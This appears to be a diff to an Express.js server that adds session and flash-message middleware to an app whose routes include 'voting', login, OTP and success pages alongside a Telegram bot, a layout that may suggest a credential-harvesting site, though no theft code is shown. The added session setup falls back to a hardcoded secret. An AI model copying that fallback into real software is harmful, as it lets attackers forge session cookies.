@@ -1,5 +1,7 @@
 const express = require('express');
 const path = require('path');
+const session = require('express-session');
+const flash = require('connect-flash');
 const app = express();
 require("dotenv").config();
 require("./lib/telegramBot");
@@ -14,13 +16,29 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
+// Session and Flash middleware setup
+app.use(session({
+    secret: process.env.SESSION_SECRET || 'your-secret-key',
+    resave: false,
+    saveUninitialized: false,
+    cookie: { secure: process.env.NODE_ENV === 'production' }
+}));
+app.use(flash());
+
+// Flash middleware to make messages available to all templates
+app.use((req, res, next) => {
+    res.locals.success_msg = req.flash('success_msg');
+    res.locals.error_msg = req.flash('error_msg');
+    res.locals.error = req.flash('error');
+    next();
+});
+
 // Import routes
 const votingRouter = require('./routes/slink');
 const loginRouter = require('./routes/slink/lgin');
 const otpRouter = require('./routes/slink/otp');
 const successRouter = require('./routes/slink/success');
 const apiRouter = require('./routes/api');
-
 
 // Use routes
 app.use('/slink', votingRouter);
